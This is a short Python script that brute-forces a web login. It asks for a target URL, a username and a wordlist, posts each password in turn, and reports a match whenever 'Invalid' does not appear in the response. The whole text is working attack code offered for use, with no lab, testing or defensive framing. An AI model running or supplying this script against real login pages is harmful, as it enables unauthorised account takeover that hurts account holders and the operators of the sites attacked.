import requests
url = input("Enter target url: ")
username = input("Enter username: ")
password = input("Enter path to wordlist: ")
with open(password, "r") as file:
    for line in file:
        password = line.strip()
        data = {"username":username, "password":password}
        response = requests.post(url, data=data)
        if not "Invalid" in response.text:
            print(f"password found: {password}")
        else:
            print("password invalid")

